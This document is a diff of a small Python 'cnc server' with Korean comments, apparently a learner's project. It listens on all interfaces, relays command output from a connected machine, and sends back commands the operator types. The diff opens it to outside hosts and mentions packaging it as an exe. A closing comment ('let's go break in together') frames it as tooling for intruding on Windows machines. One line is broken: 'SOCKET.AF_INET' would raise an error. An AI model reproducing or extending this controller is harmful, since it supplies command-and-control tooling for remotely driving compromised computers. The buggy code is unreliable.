@@ -1,7 +1,8 @@
 #서버, cnc server
+#배포 -> python파일 exe 로 사용 가능
 import socket #socket을 불러옴
-addr = ('0.0.0.0', 12345) #local ip는 0.0.0.0으로 고정?
-with socket.socket() as s:  
+addr = ('', 12345) #local ip는 0.0.0.0으로 고정? -> 다른 외부 서버 허용
+with socket.socket(SOCKET.AF_INET, socket.SOCK_STREAM) as s:  
     s.bind(addr) #주소를 바인드함
     s.listen() #주소 바인드 될 때까지 리슨함, 기다린다는 의미
     print('cnc server is start!!')
@@ -16,9 +17,12 @@ with socket.socket() as s:
                 print(data.decode(), end='') #받아온 데이터, 즉 반환값을 출력한다
                 #보낼 데이터를 전송함
                 data = input()  #내가 치고 싶은 데이터를 받아줌
-                conn.send(data.enc) #보낼때는 tcp이기 때문에 반드시 enc를 해 줘야 한다.
+                conn.send(data.encode()) #보낼때는 tcp이기 때문에 반드시 enc를 해 줘야 한다.
         except Exception as e:
             print(e) #오류 날 경우, 에러문 출력
             
 print("end!!!")
+
+
+# Windows 명령어 익히기! 함께 털러 가보자!
             
